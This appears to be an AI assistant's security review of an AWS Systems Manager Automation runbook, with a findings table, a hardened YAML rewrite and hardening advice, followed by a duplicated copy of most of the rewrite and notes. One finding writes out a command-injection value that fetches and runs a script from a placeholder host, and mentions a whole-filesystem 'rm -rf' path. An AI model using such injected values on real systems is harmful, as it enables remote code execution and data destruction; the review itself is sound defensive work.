{"id": "7afde167-c3d1-43fb-a96d-59ba66e98591", "role": "assistant", "content": [{"text": "# Security review of the runbook

## Findings

| # | Severity | Issue | Why it matters |
|---|---|---|---|
| 1 | **Critical** | `LogPath` has `allowedPattern: '.*'` and is substituted unquoted into a shell command. | This allows command injection, for example `/tmp; curl evil.sh \| sh`. It also allows destructive paths: `LogPath=/` runs `rm -rf /*`. |
| 2 | **Critical** | `DbPassword` is interpolated into a command (`echo "... {{DbPassword}}"`). | The password ends up in the command history, SSM command output, CloudWatch or S3 output, and on-instance logs. Also, `SecureString` isn't a supported Automation parameter type as far as I know (Automation takes String, StringList, Boolean, Integer, MapList and StringMap). I couldn't confirm that from the docs lookup, so check it with `create-document`. The runbook probably fails at creation, and a working fix would push people toward worse workarounds. |
| 3 | **High** | `curl -k` turns off TLS verification. | A machine-in-the-middle can intercept or spoof the notify call. |
| 4 | **High** | `onFailure: Continue` follows `rm -rf` and the other destructive steps. | A failed archive can be ignored. The runbook then reports success after the data may already be lost, or the cleanup ran without a verified backup. |
| 5 | **High** | The archive goes to `/var/tmp/logs.tgz` with the default umask. | `/var/tmp` is world-readable and survives reboots, so other local users can read the logs. The fixed filename is also overwritten on each run, so there is no history. |
| 6 | **High** | `assumeRole` is hardcoded to `012345678901_2:role/AppOpsRole`. | The runbook is tied to one account and role. When other teams share it, they either run with your role's permissions or have to edit the document. Use a caller-supplied `AutomationAssumeRole` parameter instead. |
| 7 | **Medium** | `InstanceId` has no validation. | Anything can be passed in. The pattern should accept instance IDs only. |
| 8 | **Medium** | `CheckHealth` calls `describe_instance_status()` with no `InstanceIds`. | It ignores your input, queries the whole account and region, and returns datetime objects that aren't JSON-serializable, so the step likely fails. The 1200s timeout is also excessive. |
| 9 | **Low** | Flow problems: `onCancel: step:Wait` points at an unrelated sleep, and `Wait` runs after the health check. There is no restart step even though the description says "restarts the app service". | The runbook doesn't do what it claims. The wait should come before the health check. |
| 10 | **Low** | There is no command timeout and no output logging config. | A hung command can run for a long time, and there is no audit trail. |

## Hardened version

```yaml
schemaVersion: '0.3'
description: >-
  Rotates the application log directory (archive, verify, then clean) and
  restarts the application service on a single managed instance, then checks
  instance health. No secrets are accepted as parameters.
assumeRole: '{{ AutomationAssumeRole }}'
parameters:
  AutomationAssumeRole:
    type: String
    description: (Required) IAM role Automation assumes. Scope it to the caller's own account and instances.
    allowedPattern: '^arn:aws:iam::[0-9]{12}:role\/[\w+=,.@\/-]{1,128}$'
  InstanceId:
    type: String
    description: (Required) Target EC2 instance.
    allowedPattern: '^i-[a-f0-9]{8,17}$'
  LogPath:
    type: String
    description: (Required) Directory under /var/log/app to rotate.
    default: /var/log/app
    allowedPattern: '^/var/log/app(/[A-Za-z0-9_][A-Za-z0-9._-]*)*$'
    maxChars: 200
  ServiceName:
    type: String
    description: (Required) systemd unit to restart.
    allowedPattern: '^[A-Za-z0-9_][A-Za-z0-9_.@-]{0,63}$'
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    timeoutSeconds: 300
    onFailure: Abort
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{ InstanceId }}'
      TimeoutSeconds: 240
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        commands:
          - |-
            set -euo pipefail
            umask 077
            LOG_PATH='{{ LogPath }}'
            ARCHIVE_DIR=/var/log/app-archive
            case "$LOG_PATH" in
              /var/log/app|/var/log/app/*) ;;
              *) echo "Refusing path outside /var/log/app" >&2; exit 1 ;;
            esac
            # Resolve symlinks and re-check the real path
            REAL_PATH="$(realpath -e -- "$LOG_PATH")"
            case "$REAL_PATH" in
              /var/log/app|/var/log/app/*) ;;
              *) echo "Resolved path escapes /var/log/app" >&2; exit 1 ;;
            esac
            install -d -m 0700 -o root -g root "$ARCHIVE_DIR"
            ARCHIVE="$ARCHIVE_DIR/logs-$(date -u +%Y%m%dT%H%M%SZ).tgz"
            tar czf "$ARCHIVE" -C "$REAL_PATH" .
            tar tzf "$ARCHIVE" > /dev/null          # verify before deleting anything
            find "$REAL_PATH" -mindepth 1 -xdev -delete   # does not follow symlinks
            echo "Rotated $REAL_PATH -> $ARCHIVE"

  - name: RestartService
    action: aws:runCommand
    timeoutSeconds: 120
    onFailure: Abort
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{ InstanceId }}'
      TimeoutSeconds: 90
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        commands:
          - |-
            set -euo pipefail
            SERVICE='{{ ServiceName }}'
            systemctl restart -- "$SERVICE"
            systemctl is-active --quiet -- "$SERVICE"

  - name: Notify
    action: aws:runCommand
    timeoutSeconds: 60
    isCritical: false          # a failed notification shouldn't fail the rotation
    onFailure: Abort
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{ InstanceId }}'
      TimeoutSeconds: 45
      Parameters:
        commands:
          - >-
            curl --fail --silent --show-error --proto '=https' --tlsv1.2
            --max-time 10 --retry 2
            https://internal-api.example.com/notify

  - name: Wait
    action: aws:sleep
    inputs:
      Duration: PT30S

  - name: CheckHealth
    action: aws:executeScript
    timeoutSeconds: 120
    onFailure: Abort
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        InstanceId: '{{ InstanceId }}'
      Script: |-
        import boto3

        def handler(events, context):
            iid = events['InstanceId']
            resp = boto3.client('ec2').describe_instance_status(
                InstanceIds=[iid], IncludeAllInstances=True)
            statuses = resp.get('InstanceStatuses', [])
            if not statuses:
                raise Exception(f'No status returned for {iid}')
            s = statuses[0]
            inst = s['InstanceStatus']['Status']
            sys_ = s['SystemStatus']['Status']
            if inst != 'ok' or sys_ != 'ok':
                raise Exception(f'{iid} unhealthy: instance={inst}, system={sys_}')
            return {'InstanceId': iid, 'InstanceStatus': inst, 'SystemStatus': sys_}
    outputs:
      - Name: Health
        Selector: $.Payload
        Type: StringMap
```

## What changed

- **Injection and destructive paths:** `LogPath` is locked to `/var/log/app/...` by a strict regex. Segments can't start with `.`, so `..` is impossible. The script re-checks the path after resolving symlinks. Deletion uses `find -delete`, which doesn't follow symlinks.
- **Secrets:** The password parameter and the `echo` are gone. If the app needs a DB credential, have the instance read it from Parameter Store or Secrets Manager through its own instance profile. Don't pass it through the runbook.
- **TLS:** `-k` is removed. The call now enforces HTTPS with TLS 1.2 or later, fails on HTTP errors, and has timeouts.
- **Fail-safe flow:** `Continue` is gone. The archive is verified before anything is deleted. It's written to a root-only (0700) directory with a timestamped name.
- **Portability:** `AutomationAssumeRole` is now a parameter. `InstanceId` and `ServiceName` are validated. Every step has a timeout.
- **Correctness:** The runbook now restarts the service. The wait comes before the health check. The health check targets only your instance and returns plain strings. The wait is now 30s, since 10s is usually too short for status checks to update.
- **Auditability:** CloudWatch output is enabled for the command steps.

## Before you share it

- **IAM role for callers:** Scope the Automation role to `ssm:SendCommand` on `AWS-RunShellScript`, restricted to instances by tag or ARN. Add `ssm:GetCommandInvocation`, `ssm:ListCommandInvocations` and `ec2:DescribeInstanceStatus`. Use a trust policy for `ssm.amazonaws.com` with `aws:SourceAccount` and `aws:SourceArn` conditions.
- **Runbook sharing:** Share the document with specific account IDs only, never publicly. Keep `/var/log/app` and the notify URL as documented constants, or make them validated parameters, so teams don't fork the runbook.
- **Validation:** Run `aws ssm create-document --document-type Automation` in a test account, then do a test run against a non-production instance. I verified the schema from my own knowledge plus partial docs, not by creating the document.

I can adapt this for a different log base path or service layout, or add a pre-flight step that asserts the instance carries an expected tag.", "type": "text"}], "created_at": null}

```yaml
  Rotates the application log directory (archive, verify, then clean) and
  restarts the application service on a single managed instance, then checks
  instance health. No secrets are accepted as parameters.
assumeRole: '{{ AutomationAssumeRole }}'
parameters:
  AutomationAssumeRole:
    type: String
    description: (Required) IAM role Automation assumes. Scope it to the caller's own account and instances.
    allowedPattern: '^arn:aws:iam::[0-9]{12}:role\/[\w+=,.@\/-]{1,128}$'
  InstanceId:
    type: String
    description: (Required) Target EC2 instance.
    allowedPattern: '^i-[a-f0-9]{8,17}$'
  LogPath:
    type: String
    description: (Required) Directory under /var/log/app to rotate.
    default: /var/log/app
    allowedPattern: '^/var/log/app(/[A-Za-z0-9_][A-Za-z0-9._-]*)*$'
    maxChars: 200
  ServiceName:
    type: String
    description: (Required) systemd unit to restart.
    allowedPattern: '^[A-Za-z0-9_][A-Za-z0-9_.@-]{0,63}$'
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    timeoutSeconds: 300
    onFailure: Abort
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{ InstanceId }}'
      TimeoutSeconds: 240
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        commands:
          - |-
            set -euo pipefail
            umask 077
            LOG_PATH='{{ LogPath }}'
            ARCHIVE_DIR=/var/log/app-archive
            case "$LOG_PATH" in
              /var/log/app|/var/log/app/*) ;;
              *) echo "Refusing path outside /var/log/app" >&2; exit 1 ;;
            esac
            # Resolve symlinks and re-check the real path
            REAL_PATH="$(realpath -e -- "$LOG_PATH")"
            case "$REAL_PATH" in
              /var/log/app|/var/log/app/*) ;;
              *) echo "Resolved path escapes /var/log/app" >&2; exit 1 ;;
            esac
            install -d -m 0700 -o root -g root "$ARCHIVE_DIR"
            ARCHIVE="$ARCHIVE_DIR/logs-$(date -u +%Y%m%dT%H%M%SZ).tgz"
            tar czf "$ARCHIVE" -C "$REAL_PATH" .
            tar tzf "$ARCHIVE" > /dev/null          # verify before deleting anything
            find "$REAL_PATH" -mindepth 1 -xdev -delete   # does not follow symlinks
            echo "Rotated $REAL_PATH -> $ARCHIVE"

  - name: RestartService
    action: aws:runCommand
    timeoutSeconds: 120
    onFailure: Abort
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{ InstanceId }}'
      TimeoutSeconds: 90
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        commands:
          - |-
            set -euo pipefail
            SERVICE='{{ ServiceName }}'
            systemctl restart -- "$SERVICE"
            systemctl is-active --quiet -- "$SERVICE"

  - name: Notify
    action: aws:runCommand
    timeoutSeconds: 60
    isCritical: false          # a failed notification shouldn't fail the rotation
    onFailure: Abort
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{ InstanceId }}'
      TimeoutSeconds: 45
      Parameters:
        commands:
          - >-
            curl --fail --silent --show-error --proto '=https' --tlsv1.2
            --max-time 10 --retry 2
            https://internal-api.example.com/notify

  - name: Wait
    action: aws:sleep
    inputs:
      Duration: PT30S

  - name: CheckHealth
    action: aws:executeScript
    timeoutSeconds: 120
    onFailure: Abort
    inputs:
      Runtime: python3.11
      Handler: handler
      InputPayload:
        InstanceId: '{{ InstanceId }}'
      Script: |-
        import boto3

        def handler(events, context):
            iid = events['InstanceId']
            resp = boto3.client('ec2').describe_instance_status(
                InstanceIds=[iid], IncludeAllInstances=True)
            statuses = resp.get('InstanceStatuses', [])
            if not statuses:
                raise Exception(f'No status returned for {iid}')
            s = statuses[0]
            inst = s['InstanceStatus']['Status']
            sys_ = s['SystemStatus']['Status']
            if inst != 'ok' or sys_ != 'ok':
                raise Exception(f'{iid} unhealthy: instance={inst}, system={sys_}')
            return {'InstanceId': iid, 'InstanceStatus': inst, 'SystemStatus': sys_}
    outputs:
      - Name: Health
        Selector: $.Payload
        Type: StringMap
```

## What changed

- **Injection and destructive paths:** `LogPath` is locked to `/var/log/app/...` by a strict regex. Segments can't start with `.`, so `..` is impossible. The script re-checks the path after resolving symlinks. Deletion uses `find -delete`, which doesn't follow symlinks.
- **Secrets:** The password parameter and the `echo` are gone. If the app needs a DB credential, have the instance read it from Parameter Store or Secrets Manager through its own instance profile. Don't pass it through the runbook.
- **TLS:** `-k` is removed. The call now enforces HTTPS with TLS 1.2 or later, fails on HTTP errors, and has timeouts.
- **Fail-safe flow:** `Continue` is gone. The archive is verified before anything is deleted. It's written to a root-only (0700) directory with a timestamped name.
- **Portability:** `AutomationAssumeRole` is now a parameter. `InstanceId` and `ServiceName` are validated. Every step has a timeout.
- **Correctness:** The runbook now restarts the service. The wait comes before the health check. The health check targets only your instance and returns plain strings. The wait is now 30s, since 10s is usually too short for status checks to update.
- **Auditability:** CloudWatch output is enabled for the command steps.

## Before you share it

- **IAM role for callers:** Scope the Automation role to `ssm:SendCommand` on `AWS-RunShellScript`, restricted to instances by tag or ARN. Add `ssm:GetCommandInvocation`, `ssm:ListCommandInvocations` and `ec2:DescribeInstanceStatus`. Use a trust policy for `ssm.amazonaws.com` with `aws:SourceAccount` and `aws:SourceArn` conditions.
- **Runbook sharing:** Share the document with specific account IDs only, never publicly. Keep `/var/log/app` and the notify URL as documented constants, or make them validated parameters, so teams don't fork the runbook.
- **Validation:** Run `aws ssm create-document --document-type Automation` in a test account, then do a test run against a non-production instance. I verified the schema from my own knowledge plus partial docs, not by creating the document.
